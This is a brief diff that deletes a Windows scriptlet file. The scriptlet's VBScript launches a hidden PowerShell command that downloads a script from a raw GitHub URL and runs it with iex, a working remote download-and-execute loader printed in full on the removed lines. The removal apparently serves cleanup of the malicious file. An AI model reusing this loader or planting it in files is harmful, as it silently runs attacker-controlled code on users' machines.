@@ -1,5 +1,0 @@
-<?XML version="1.0"?>
-<scriptlet><registration><script language="VBScript">
-Set s=CreateObject("WScript.Shell")
-s.Run "powershell -w h iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0pie/ByeHax/refs/heads/main/xzae'))",0
-</script></registration></scriptlet>
